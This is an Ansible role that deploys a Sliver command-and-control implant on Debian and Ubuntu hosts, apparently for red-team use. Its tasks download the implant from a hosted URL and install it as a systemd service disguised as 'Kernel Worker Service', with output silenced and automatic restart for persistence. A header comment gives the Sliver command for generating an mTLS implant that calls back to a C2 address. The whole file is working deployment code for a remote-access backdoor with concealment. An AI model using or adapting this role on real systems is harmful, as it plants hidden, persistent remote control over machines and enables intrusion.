---
# Deploys a pre-generated Sliver implant on Debian 13 and Ubuntu 24.04
# Pre-requisite: generate and host the implant before running this role:
#   sliver> generate --mtls <C2_IP>:<port> --os linux --save /tmp/staging/sliver-implant-linux

- name: "[Sliver/Linux] Install prerequisites"
  package:
    name:
      - curl
      - wget
    state: present

- name: "[Sliver/Linux] Download Sliver implant"
  get_url:
    url:  "{{ sliver_linux_binary_url }}"
    dest: "{{ sliver_linux_bin_path }}"
    mode: "0755"
    force: true

- name: "[Sliver/Linux] Install systemd service"
  copy:
    dest: "/etc/systemd/system/{{ sliver_linux_service_name }}.service"
    mode: "0644"
    content: |
      [Unit]
      Description=Kernel Worker Service
      After=network-online.target
      Wants=network-online.target

      [Service]
      ExecStart={{ sliver_linux_bin_path }}
      Restart=always
      RestartSec=15
      StandardOutput=null
      StandardError=null

      [Install]
      WantedBy=multi-user.target

- name: "[Sliver/Linux] Enable and start service"
  systemd:
    name: "{{ sliver_linux_service_name }}"
    enabled: true
    state: started
    daemon_reload: true

- name: "[Sliver/Linux] Verify service is active"
  command: "systemctl is-active {{ sliver_linux_service_name }}"
  register: sliver_svc_state
  changed_when: false

- name: "[Sliver/Linux] Print service state"
  debug:
    msg: "Sliver service state on {{ inventory_hostname }}: {{ sliver_svc_state.stdout }}"
